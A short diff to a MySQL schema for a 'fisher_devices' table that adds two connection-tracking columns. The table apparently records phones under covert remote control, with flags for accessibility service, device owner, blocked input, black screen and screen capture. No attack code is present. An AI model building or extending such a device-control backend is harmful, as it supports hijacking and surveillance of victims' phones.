@@ -51,7 +51,7 @@ CREATE TABLE IF NOT EXISTS fisher_devices (
   os_version VARCHAR(64) DEFAULT '', sdk_version INT DEFAULT 0,
   app_version VARCHAR(64) DEFAULT '', app_name VARCHAR(128) DEFAULT '', package_name VARCHAR(255) DEFAULT '',
   battery_level INT DEFAULT 0, is_charging TINYINT DEFAULT 0,
-  is_connected TINYINT DEFAULT 0, is_screen_on TINYINT DEFAULT 0, is_locked TINYINT DEFAULT 0,
+  is_connected TINYINT DEFAULT 0, local_service_connected TINYINT DEFAULT 0, is_screen_on TINYINT DEFAULT 0, is_locked TINYINT DEFAULT 0,
   accessibility_alive TINYINT DEFAULT 0, permissions TEXT NULL,
   is_device_owner TINYINT DEFAULT 0, device_input_blocked TINYINT DEFAULT 0, black_screen_active TINYINT DEFAULT 0,
   adb_enabled TINYINT DEFAULT 0, adb_wifi_enabled TINYINT DEFAULT 0, adb_deploy_enabled TINYINT DEFAULT 0,
@@ -62,7 +62,7 @@ CREATE TABLE IF NOT EXISTS fisher_devices (
   storage_total BIGINT DEFAULT 0, storage_free BIGINT DEFAULT 0,
   cpu_info VARCHAR(255) DEFAULT '', mem_total BIGINT DEFAULT 0, mem_free BIGINT DEFAULT 0,
   tpx_running TINYINT DEFAULT 0, dxs_running TINYINT DEFAULT 0, minicap_mode VARCHAR(32) DEFAULT '',
-  last_seen BIGINT DEFAULT 0, first_seen BIGINT DEFAULT 0, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
+  connected_at BIGINT DEFAULT 0, last_seen BIGINT DEFAULT 0, first_seen BIGINT DEFAULT 0, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
   custom_info MEDIUMTEXT NULL,
   INDEX idx_owner (owner_username), INDEX idx_online (is_connected), INDEX idx_seen (last_seen)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
